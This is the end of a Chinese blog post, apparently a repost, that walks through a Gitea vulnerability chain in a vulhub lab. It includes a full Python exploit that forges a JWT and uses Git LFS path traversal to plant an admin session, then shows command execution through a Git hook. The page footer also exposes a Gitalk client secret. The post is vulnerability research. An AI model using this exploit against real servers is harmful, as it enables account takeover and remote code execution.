+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">'http://your-ip:3000/vulhub/repo'</span></span><br><span class="line">JWT_SECRET = <span class="string">'AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y'</span></span><br><span class="line">USER_ID = <span class="number">1</span></span><br><span class="line">REPO_ID = <span class="number">1</span></span><br><span class="line">SESSION_ID = <span class="string">'11vulhub'</span></span><br><span class="line">SESSION_DATA = bytes.fromhex(<span class="string">'0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_token</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_base64</span><span class="params">(data)</span>:</span></span><br><span class="line">        missing_padding = len(data) % <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">            data += <span class="string">'='</span>* (<span class="number">4</span> - missing_padding)</span><br><span class="line">        <span class="keyword">return</span> base64.urlsafe_b64decode(data)</span><br><span class="line"></span><br><span class="line">    nbf = int(time.time())-(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">1000</span>)</span><br><span class="line">    exp = int(time.time())+(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    token = jwt.encode(&#123;<span class="string">'user'</span>: USER_ID, <span class="string">'repo'</span>: REPO_ID, <span class="string">'op'</span>: <span class="string">'upload'</span>, <span class="string">'exp'</span>: exp, <span class="string">'nbf'</span>: nbf&#125;, decode_base64(JWT_SECRET), algorithm=<span class="string">'HS256'</span>)</span><br><span class="line">    <span class="keyword">return</span> token.decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">yield</span> SESSION_DATA</span><br><span class="line">    time.sleep(<span class="number">300</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OID = <span class="string">f'....gitea/sessions/<span class="subst">&#123;SESSION_ID[<span class="number">0</span>]&#125;</span>/<span class="subst">&#123;SESSION_ID[<span class="number">1</span>]&#125;</span>/<span class="subst">&#123;SESSION_ID&#125;</span>'</span></span><br><span class="line">response = requests.post(<span class="string">f'<span class="subst">&#123;BASE_URL&#125;</span>.git/info/lfs/objects'</span>, headers=&#123;</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'application/vnd.git-lfs+json'</span></span><br><span class="line">&#125;, json=&#123;</span><br><span class="line">    <span class="string">"Oid"</span>: OID,</span><br><span class="line">    <span class="string">"Size"</span>: <span class="number">100000</span>,</span><br><span class="line">    <span class="string">"User"</span> : <span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"Password"</span> : <span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"Repo"</span> : <span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"Authorization"</span> : <span class="string">"a"</span></span><br><span class="line">&#125;)</span><br><span class="line">logging.info(response.text)</span><br><span class="line"></span><br><span class="line">response = requests.put(<span class="string">f"<span class="subst">&#123;BASE_URL&#125;</span>.git/info/lfs/objects/<span class="subst">&#123;quote(OID, safe=<span class="string">''</span>)&#125;</span>"</span>, data=gen_data(), headers=&#123;</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'application/vnd.git-lfs'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/vnd.git-lfs'</span>,</span><br><span class="line">    <span class="string">'Authorization'</span>: <span class="string">f'Bearer <span class="subst">&#123;generate_token()&#125;</span>'</span></span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本会将伪造的SESSION数据发送，并等待300秒后才关闭连接。在这300秒中，服务器上将存在一个名为“11vulhub.tmp”的文件，这也是session id。</p>
+<p>带上这个session id，即可提升为管理员。</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/e8616151-ce20-4ea1-a331-6ed660de954e.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/e8616151-ce20-4ea1-a331-6ed660de954e.c328b0c52e0a.png" alt="bfa742e1-62e4-47d8-a2e8-862779857b3a.png"></a></p>
+<h2 id="漏洞六、利用HOOK执行任意命令"><a href="#漏洞六、利用HOOK执行任意命令" class="headerlink" title="漏洞六、利用HOOK执行任意命令"></a>漏洞六、利用HOOK执行任意命令</h2><p>带上<code>i_like_gitea=11vulhub.tmp</code>这个Cookie，我们即可访问管理员账户。</p>
+<p>然后随便找个项目，在设置中配置Git钩子。Git钩子是执行git命令的时候，会被自动执行的一段脚本。比如我这里用的pre-receive钩子，就是在commit之前会执行的脚本。我在其中加入待执行的命令<code>touch /tmp/success</code>：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/0af8f3a4-0025-48af-87e6-1703e5d3dfdc.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/0af8f3a4-0025-48af-87e6-1703e5d3dfdc.ddc23253b10a.png" alt="6f2f20d0-e6a8-4a7f-8bfe-3d3fe52ea0e4.png"></a></p>
+<p>然后在网页端新建一个文件，点提交。进入docker容器，可见命令被成功执行：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/40176a75-06c9-41e5-81c3-3c6e76b689ad.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/40176a75-06c9-41e5-81c3-3c6e76b689ad.690d6a4c049f.png" alt="80288a07-c5f0-4a4c-8da0-b6f82a66e81b.png"></a></p>
+<h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><p>整个漏洞链非常流畅，Go Web端的代码审计也非常少见，在传统漏洞越来越少的情况下，这些好思路将给安全研究者带来很多不一样的突破。</p>
+<p>不过漏洞作者给出的POC实在是比较烂，基本离开了他自己的环境就不能用了，而且我也不建议用一键化的漏洞利用脚本来复现这个漏洞，原因是这个漏洞的利用涉及到一些不确定量，比如：</p>
+<ol>
+<li>gitea的<code>$GITEA_CUSTOM</code>，这个值影响到读取app.ini的那段POC</li>
+<li>管理员的用户名和ID，这个可能需要猜。但其实我们也没必要必须伪造管理员的session，我们可以伪造任意一个用户的session，然后进入网站后再找找看看有没有管理员所创建的项目，如果有的话，就可以得知管理员的用户名了。</li>
+</ol>
+<p>另外，复现漏洞的时候也遇到过一些坑，比如gitea第一次安装好，如果不重启的话，他的session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。</p>
+<p>如果目标系统使用的是sqlite做数据库，我们可以直接下载其数据库，并拿到他的密码哈希和另一个随机字符串，利用这两个值其实能直接伪造管理员的cookie（名为<code>gitea_incredible</code>），这一点我就不写了，大家可以自己查看文档。</p>
+<p>转自：</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/19/2019-1-19-go代码审计/" title="go代码审计">https://wh0ale.github.io/2019/01/19/2019-1-19-go代码审计/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/17/2019-1-17-session漏洞/" rel="next" title="session引发的漏洞">
+                <i class="fa fa-chevron-left"></i> session引发的漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/19/2019-1-19-攻击LNMP架构Web应用的几个小Tricks/" rel="prev" title="攻击LNMP架构Web应用的几个小Tricks">
+                攻击LNMP架构Web应用的几个小Tricks <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞一、-逻辑错误导致权限绕过辑中"><span class="nav-number">1.</span> <span class="nav-text">漏洞一、 逻辑错误导致权限绕过辑中</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞二、目录穿越漏洞"><span class="nav-number">2.</span> <span class="nav-text">漏洞二、目录穿越漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞三、读取配置文件，构造JWT密文"><span class="nav-number">3.</span> <span class="nav-text">漏洞三、读取配置文件，构造JWT密文</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞四、利用条件竞争，写入任意文件"><span class="nav-number">4.</span> <span class="nav-text">漏洞四、利用条件竞争，写入任意文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞五、伪造session提升权限"><span class="nav-number">5.</span> <span class="nav-text">漏洞五、伪造session提升权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞六、利用HOOK执行任意命令"><span class="nav-number">6.</span> <span class="nav-text">漏洞六、利用HOOK执行任意命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些思考"><span class="nav-number">7.</span> <span class="nav-text">一些思考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
